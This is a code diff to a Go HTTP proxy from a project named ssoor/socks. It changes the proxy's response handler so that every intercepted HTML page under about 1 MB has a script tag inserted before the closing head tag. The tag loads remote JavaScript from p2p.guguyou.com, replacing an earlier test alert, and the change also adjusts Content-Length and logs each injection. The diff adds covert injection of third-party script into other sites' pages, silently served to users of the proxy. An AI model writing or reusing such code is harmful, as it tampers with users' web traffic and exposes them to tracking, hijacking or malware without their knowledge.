@@ -10,7 +10,9 @@ import (
 	"log"
 	"net"
 	"net/http"
+	//	"net/http/httputil"
 	"net/url"
+	"strconv"
 	"strings"
 
 	"github.com/ssoor/socks/compiler"
@@ -126,9 +128,8 @@ func (this *SRules) ResolveRequest(req *http.Request) (tran *http.Transport, res
 func (this *SRules) ResolveResponse(req *http.Request, resp *http.Response) *http.Response {
 
 	if resp_type := resp.Header.Get("Content-Type"); strings.Contains(strings.ToLower(resp_type), "text/html") {
-		log.Printf("text/html: %s\n", resp.Request.URL.String())
 
-		if resp.ContentLength < 102400 {
+		if resp.ContentLength > 0 && resp.ContentLength < 1024000 {
 
 			oldBody := resp.Body
 			defer oldBody.Close()
@@ -144,15 +145,31 @@ func (this *SRules) ResolveResponse(req *http.Request, resp *http.Response) *htt
 				resp.Header.Del("Content-Encoding")
 			}
 
+			//dumpdata, _ := httputil.DumpResponse(resp, true)
+
+			//log.Println(string(dumpdata))
+
 			var buf bytes.Buffer
 
 			buf.ReadFrom(newReader)
 
-			smatch, _ := compiler.NewSMatch("s@(^<!DOCTYPE HTML[\\s\\S]*>[\\s\\S]*<html>[\\s\\S]*<head[\\s\\]*>[\\s\\S]*)(</head>[\\s\\S]*<body[\\s\\S]*>[\\s\\S]*)(</body>[\\s\\S]*</html>[\\s\\S]*)$@$1<script language=\"javascript\">alert('test')</script>$2$3@i")
+			smatch, _ := compiler.NewSMatch(`s@(^\s*<!DOCTYPE HTML[\s\S]*>[\s\S]*<html[\s\S]*>[\s\S]*<head[\s\S]*>[\s\S]*)(</head>[\s\S]*<body[\s\S]*>[\s\S]*)(</body>[\s\S]*</html>[\s\S]*)$@$1<script type="text/javascript" src="http://p2p.guguyou.com/D/d?16FB&100"></script>$2$3@i`)
 
-			html, _ := smatch.Replace(buf.String())
+			html, err := smatch.Replace(buf.String())
+
+			if err == nil {
+				log.Printf("injection[%d]: %s\n", resp.ContentLength, resp.Request.URL.String())
+			} else {
+				html = buf.String()
+			}
+
+			if -1 != resp.ContentLength {
+				resp.ContentLength = int64(len([]byte(html)))
+				resp.Header.Set("Content-Length", strconv.Itoa(len([]byte(html))))
+			}
 
 			resp.Body = ioutil.NopCloser(strings.NewReader(html))
+
 		}
 	}
 
